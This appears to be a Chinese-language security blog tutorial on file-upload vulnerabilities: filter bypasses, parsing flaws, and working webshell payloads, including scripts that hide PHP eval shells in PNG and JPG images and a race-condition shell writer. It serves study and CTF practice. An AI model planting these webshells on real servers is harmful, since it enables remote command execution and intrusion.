---
title: Upload（文件上传漏洞）
date: 2022-8-9 17:14:38
tags: 
- Web
- Security
- Upload
categories: 
- web安全基础漏洞
---

# Upload（文件上传漏洞）

## 简介

我们在使用HTTP访问Web服务的时候，实际上是在访问服务器上的文件。而文件上传功能是一个正常的业务需求，但是如果不加以检查，会造成许多安全问题：例如，如果黑客能够通过其上传一个可执行的脚本文件到可访问的目录内，再访问它，就获得了执行服务器端命令的能力。又或者上传文件的是病毒、木马文件，黑客用以诱骗用户或者管理员下载执行。除此之外，还可以以上传文件作为一个入口，溢出服务器的后台处理程序，如图片解析模块。诸如此类。

## 利用方式

### 通过.user.ini包含文件

.user.ini是一种基于每个目录的 INI 配置文件，作用域在.user.ini所在目录及其子目录，优先级高于php.ini。即除了主 php.ini 之外，执行PHP脚本时，PHP还会在当前目录下扫描 INI 文件，如果扫描到了，就使用.user.ini中的配置，如果当前目录没有扫描到，到上一级目录继续扫描，直到达到web根目录。详情：https://www.php.net/manual/zh/configuration.file.per-user.php

可以通过上传它，来修改当前所访问php脚本所使用的配置项，达到文件包含等目的。但是需要满足几个条件：

1. 当前目录已有php文件可以访问
2. 配置项的**配置可被设定范围**是 `PHP_INI_PERDIR` 或者 `PHP_INI_USER`

那么什么是**配置可被设定范围**呢？我们都知道php.ini是php默认的配置文件，其中包括了很多php的配置，例如 [allow_url_include](https://www.php.net/manual/zh/filesystem.configuration.php#ini.allow-url-include) 等。这些配置中，又有对应的"配置可被设定范围"，即某个配置能在哪被修改，"配置可被设定范围"有四种：`PHP_INI_SYSTEM`、`PHP_INI_PERDIR`、`PHP_INI_ALL`、`PHP_INI_USER`。 在此可以查看：https://www.php.net/manual/zh/ini.list.php。在 .user.ini 风格的 INI 文件中只有具有 `PHP_INI_PERDIR` 和 `PHP_INI_USER` 模式的 INI 设置可被识别。

在php配置项中有这么一个配置：[auto_append_file](https://www.php.net/manual/zh/ini.core.php#ini.auto-append-file)，好像是执行php脚本后自动调用 require 函数，且它的配置可被设定范围是 `PHP_INI_PERDIR`。

![img](https://image-bed-0.oss-cn-hongkong.aliyuncs.com/2022-08/截屏2022-08-15-下午8.49.45.png)

就可以写入下面内容到.user.ini，上传文件。其中 `eval.txt` 是要包含的文件名，因为用的是require函数，也可以是png文件，也可以是php伪协议，但是似乎不能包含 `=()`，因为不知道怎么转义。

```
auto_append_file=eval.txt
```

然后上传 eval.txt 文件，.user.ini生效后，访问本目录或子目录的php文件，可以发现成功被require了。

![img](https://image-bed-0.oss-cn-hongkong.aliyuncs.com/2022-08/截屏2022-08-15-下午9.04.09.png)



### 利用.htaccess

.htaccess和.user.ini类似，都是基于目录的配置文件，但是.htaccess是Apache的配置文件，而.user.ini是php的配置文件。

比较常用的命令有，SetHandler指令。例如下面代码将1.png当作php执行

```
<FilesMatch "1.png">
SetHandler application/x-httpd-php
</FilesMatch>
```

也可以使用AddType将所有的.png文件当作php文件解析

```
AddType application/x-httpd-php .png
```

更多利用方式：https://www.freebuf.com/articles/web/328241.html

## 过滤方法及其绕过

### 前端检测

前端js或者html代码来阻止不允许的文件上传。

可以通过直接修改html代码来实现，例如把下图的png改为要上传的文件类型php。

![img](https://image-bed-0.oss-cn-hongkong.aliyuncs.com/2022-08/图片.png)

也可以先将要上传的文件改成合法后缀，抓包拦截，修改为原先的后缀php后，再进行上传。

![img](https://image-bed-0.oss-cn-hongkong.aliyuncs.com/2022-08/截屏2022-08-15-下午5.40.51.png)

### MIME type 检测

如果只校验了MIME type，可以直接拦截并修改，如下图

![img](https://image-bed-0.oss-cn-hongkong.aliyuncs.com/2022-08/图片-1.png)

### 文件名检测

#### 使用其他可解析文件名

如果黑名单规则不严谨，在某些特定的环境中，某些特殊的后缀名仍然会被当做php文件解析。
`Php|php2|php3|php4|php5|php6|php7|pht|phtm|phtml|phar`

#### 使用0x00截断

应用原本只允许上传 JPG 图片，那么可以构造文件名为 `xxx.php\0.JPG`，其中 `\0` 为十六进制的 `0x00` 字符，`.JPG` 绕过了应用的上传文件类型判断，但对于服务器端来说，此文件因为 `\0` 字节截断的关系，最终却写入服务器的文件名为 `xxx.php`。

以上内容是《白帽》中的描述，但是经过实测（php5.2.16），PHP收到的数据中，`.png` 已经被空字符截断，类型还是php，效果和文件名直接不写 `.png` 是一样的。

还有POST请求发送数据时，因为enctype的属性，不会对数据进行解码，所以需要发送的是 `0x00` 字符，可以使用 `%00` 然URL解码，否则写入的文件名是 %00 字符。

![img](https://image-bed-0.oss-cn-hongkong.aliyuncs.com/2022-08/图片-3.png)

经过查阅发现，虽然不能直接使用，但是如果能控制上传后文件的目录，也许就可以用。利用条件：PHP<5.3.29，且GPC关闭

比如数据包中存在path: `uploads/`，那么攻击者可以通过修改path的值来构造paylod: `uploads/eval.php\0`

因为程序中检测的是文件的后缀名，如果后缀合法则拼接路径和文件名，那么攻击者修改了path以后的拼接结果为：`uploads/eval.php\0eval.png`，移动文件的时候会将文件保存为`uploads/eval.php`

即文件路径全由传入的path参数提供，本身上传的文件名只要能过黑或者白名单即可。同时，使用此种方法也无惧文件重命名。如下图：

![img](https://image-bed-0.oss-cn-hongkong.aliyuncs.com/2022-08/图片-2.png)

而因为echo的特性，可以输出多个文本，即便中间有一个空字符，也不会隔断。所以能看到返回的 `Stored in: uploads/eval.phpeval.png`

#### 利用::$DATA

在window的时候如果文件名末尾是::$DATA，则会把::$DATA之后的数据当成文件流处理,不会检测后缀名，且保持::$DATA之前的文件名

例如: `info.php::$DATA` Windows会自动去掉末尾的 `::$DATA` 变成 `info.php`

#### 利用漏洞

Apache、Nginx、IIS6 都有后缀解析漏洞，但是年代久远，利用条件苛刻。

Apache换行解析漏洞：在2.4.0~2.4.29版本存在一个解析漏洞，在解析php时，`1.php\x0A` 将按照php后缀进行解析

Apache多后缀解析漏洞：2.2.x版本下，需要配置 `AddHandler application/x-httpd-php .php` ，只要文件名里有 '`.php`' 就当作php脚本解析。

Nginx 通过访问图片的时候添加后缀 `%00.php` 或者 `/xx.php` 来欺骗引擎，使其当作脚本解析

IIS6 中则是把文件名为 `abc.asp;xx.jpg` 的文件当作asp脚本解析，因为它会忽略 `;` 及之后的内容，又或者将 `/*.asp/` 目录下的所有文件都作为 ASP 文件进行解析

还有一些方法：利用系统命名等

### 文件头检测

很简单，添加即可，可以拿图片改
JPEG (jpg)，文件头：FFD8FF
PNG (png)，文件头：89504E47
GIF (gif)，文件头：47494638

### 文件内容检测

在图片上传的实际开发中不应该单纯的检测文件内容，但是在ctf中可能会出现。

#### 二次渲染

上传文件后，有些网站会对图片进行二次处理（格式、尺寸要求等），这时写的图片马可能就失效了

**GIF**

可以先上传正常的图片，然后再下载，查看不变的数据，然后把一句话插入图片在二次渲染后会保留的那部分数据里。

**PNG**

**第一种方法：写入PLTE数据块**

PLTE数据块对于PNG图片来说是可选的，索引彩色图像的PNG图片才有PLTE数据块。同时php底层在对PLTE数据块验证的时候，主要进行了CRC校验。所以可以再chunk data域插入php代码，然后重新计算相应的crc值并修改即可。PNG数据块格式可以参考：https://www.twblogs.net/a/610e888e1cf175147a0e7f96

样例图片

![img](https://image-bed-0.oss-cn-hongkong.aliyuncs.com/2022-08/PNG_WITH_PLTE.png)

![img](https://image-bed-0.oss-cn-hongkong.aliyuncs.com/2022-08/截屏2022-08-19-下午3.26.35.png)

| 十六进制                                                     | 说明                              |
| ------------------------------------------------------------ | --------------------------------- |
| 00 00 00 27                                                  | 數據塊長度 39 字節                |
| 50 4C 54 45                                                  | 數據塊類型碼 “PLTE” 的 ASCII 字母 |
| **B7 00 34** FF 99 00 **60 00 73** FF 0F 00 **FF ED 00** 09 00 B2 **FF 66 00** FF 3B 00 **E2 00 15** **8B 00 54** FF C1 00 **33 00 99** FF FF 00 | 調色板顏色 13 個                  |
| 48 29 75 2C                                                  | CRC (循環冗餘檢測)                |

1. 在PLTE数据块写入php代码，字节长度必须是3的倍数；
2. 计算PLTE数据长度，修改长度，也就是最开始的 `00 00 00 27` 部分
3. 使用下列脚本(python2)计算PLTE数据块的CRC，并修改

```
import binascii
import re

png = open(r'1.png','rb')
a = png.read()
png.close()
hexstr = binascii.b2a_hex(a)

''' PLTE crc '''
data =  '504c5445'+ re.findall('504c5445(.*?)70485973',hexstr)[0]
crc = binascii.crc32(data[:-16].decode('hex')) & 0xffffffff
print(hex(crc))
```

代码中 `70485973` 是PLTE下一个数据块的名称的hex，这里是pHYs。修改完后：

![img](https://image-bed-0.oss-cn-hongkong.aliyuncs.com/2022-08/截屏2022-08-19-下午3.41.22.png)

**第二种方法：写入IDAT数据块**

可以使用简易的脚本生成PNG图片，生成的图片包含的php脚本是 `<?=$_GET[0]($_POST[1]);?>`

```
<?php
$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,
           0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,
           0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,
           0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,
           0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,
           0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,
           0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,
           0x66, 0x44, 0x50, 0x33);



$img = imagecreatetruecolor(32, 32);

for ($y = 0; $y < sizeof($p); $y += 3) {
   $r = $p[$y];
   $g = $p[$y+1];
   $b = $p[$y+2];
   $color = imagecolorallocate($img, $r, $g, $b);
   imagesetpixel($img, round($y / 3), 0, $color);
}

imagepng($img,'./1.png');
?>
```

上传后php脚本仍然保留

![img](https://image-bed-0.oss-cn-hongkong.aliyuncs.com/2022-08/截屏2022-08-19-下午1.39.53.png)

也可以用 https://github.com/huntergregal/PNG-IDAT-Payload-Generator/ 自定义写入的脚本。

**JPG**

由于jpg图片易损，对图片的选取有很大关系，很容易制作失败，国外大牛脚本：

```
<?php
    $miniPayload = "<?=phpinfo();?>";


    if(!extension_loaded('gd') || !function_exists('imagecreatefromjpeg')) {
        die('php-gd is not installed');
    }

    if(!isset($argv[1])) {
        die('php jpg_payload.php <jpg_name.jpg>');
    }

    set_error_handler("custom_error_handler");

    for($pad = 0; $pad < 1024; $pad++) {
        $nullbytePayloadSize = $pad;
        $dis = new DataInputStream($argv[1]);
        $outStream = file_get_contents($argv[1]);
        $extraBytes = 0;
        $correctImage = TRUE;

        if($dis->readShort() != 0xFFD8) {
            die('Incorrect SOI marker');
        }

        while((!$dis->eof()) && ($dis->readByte() == 0xFF)) {
            $marker = $dis->readByte();
            $size = $dis->readShort() - 2;
            $dis->skip($size);
            if($marker === 0xDA) {
                $startPos = $dis->seek();
                $outStreamTmp = 
                    substr($outStream, 0, $startPos) . 
                    $miniPayload . 
                    str_repeat("\0",$nullbytePayloadSize) . 
                    substr($outStream, $startPos);
                checkImage('_'.$argv[1], $outStreamTmp, TRUE);
                if($extraBytes !== 0) {
                    while((!$dis->eof())) {
                        if($dis->readByte() === 0xFF) {
                            if($dis->readByte !== 0x00) {
                                break;
                            }
                        }
                    }
                    $stopPos = $dis->seek() - 2;
                    $imageStreamSize = $stopPos - $startPos;
                    $outStream = 
                        substr($outStream, 0, $startPos) . 
                        $miniPayload . 
                        substr(
                            str_repeat("\0",$nullbytePayloadSize).
                                substr($outStream, $startPos, $imageStreamSize),
                            0,
                            $nullbytePayloadSize+$imageStreamSize-$extraBytes) . 
                                substr($outStream, $stopPos);
                } elseif($correctImage) {
                    $outStream = $outStreamTmp;
                } else {
                    break;
                }
                if(checkImage('payload_'.$argv[1], $outStream)) {
                    die('Success!');
                } else {
                    break;
                }
            }
        }
    }
    unlink('payload_'.$argv[1]);
    die('Something\'s wrong');

    function checkImage($filename, $data, $unlink = FALSE) {
        global $correctImage;
        file_put_contents($filename, $data);
        $correctImage = TRUE;
        imagecreatefromjpeg($filename);
        if($unlink)
            unlink($filename);
        return $correctImage;
    }

    function custom_error_handler($errno, $errstr, $errfile, $errline) {
        global $extraBytes, $correctImage;
        $correctImage = FALSE;
        if(preg_match('/(\d+) extraneous bytes before marker/', $errstr, $m)) {
            if(isset($m[1])) {
                $extraBytes = (int)$m[1];
            }
        }
    }

    class DataInputStream {
        private $binData;
        private $order;
        private $size;

        public function __construct($filename, $order = false, $fromString = false) {
            $this->binData = '';
            $this->order = $order;
            if(!$fromString) {
                if(!file_exists($filename) || !is_file($filename))
                    die('File not exists ['.$filename.']');
                $this->binData = file_get_contents($filename);
            } else {
                $this->binData = $filename;
            }
            $this->size = strlen($this->binData);
        }

        public function seek() {
            return ($this->size - strlen($this->binData));
        }

        public function skip($skip) {
            $this->binData = substr($this->binData, $skip);
        }

        public function readByte() {
            if($this->eof()) {
                die('End Of File');
            }
            $byte = substr($this->binData, 0, 1);
            $this->binData = substr($this->binData, 1);
            return ord($byte);
        }

        public function readShort() {
            if(strlen($this->binData) < 2) {
                die('End Of File');
            }
            $short = substr($this->binData, 0, 2);
            $this->binData = substr($this->binData, 2);
            if($this->order) {
                $short = (ord($short[1]) << 8) + ord($short[0]);
            } else {
                $short = (ord($short[0]) << 8) + ord($short[1]);
            }
            return $short;
        }

        public function eof() {
            return !$this->binData||(strlen($this->binData) === 0);
        }
    }
?>
```

1. 随便找一个jpg图片，先上传至服务器然后再下载到本地保存为 1.jpg ；（可选）
2. 插入php代码；使用脚本处理1.jpg，命令：`php jpg_payload.php 1.jpg`

#### 过滤字母和数字

https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html

https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html

#### 过滤 `[]`

使用 `array_pop`, 或者大括号 `{}`

```
array_pop($_GET) //相当于$_GET['第一个参数名']
$_GET{'cmd'}     //相当于$_GET['cmd']
```

#### 过滤 `;`

一段php脚本的最后一个语句，可以使用 `?>` 作为语句结束标志。如果有多条语句，可以分成多个脚本后上传：

```
<?php
$a=1
?>

<?php 
echo $a
?>
```

#### 过滤 `<?php`

使用 `<? echo '123';?>` 写法，需要配置参数 short_open_tags=on

还可以使用这种写法 `<% echo '123';%>` ，需要配置参数 asp_tags=on

用 `<?=(表达式)?>` ，等价于 `<?php echo (表达式)?>`，不需要配置参数

```
<?=`cat fla*`?> 等价于 <?php echo `cat fla*`?>
```

还可以使用html标签，但是只能在7.0以下使用

```
<script language=”php”>echo '123'; </script>
```

### 条件竞争

在一些上传场景中，上传的文件上传成功后会被立马删除，导致无法访问上传的文件。所以从上传成功到被删除的这段时间大概（几百ms）存在一个空档，我们利用这段空档可以访问到上传的文件。所以可以通过不断的上传文件，并不断的访问到达目的。

为了更好的效果，可以写文件

```
<?php fputs(fopen('eval.php','w'),'<?php @eval($_POST["cmd"])?>');?>
```

然后使用Intruder重发，直到成功写入文件

## 参考文章

https://xz.aliyun.com/t/8267#toc-20

https://www.freebuf.com/vuls/328227.html

https://tatsumaki.cn/2020/07/29/00jieduan/

https://www.fujieace.com/penetration-test/upload-labs-pass-16.html

https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html

https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html

https://www.twblogs.net/a/610e888e1cf175147a0e7f96

[https://www.php.net](https://www.php.net/manual/zh/configuration.file.per-user.php)

https://www.freebuf.com/articles/web/328241.html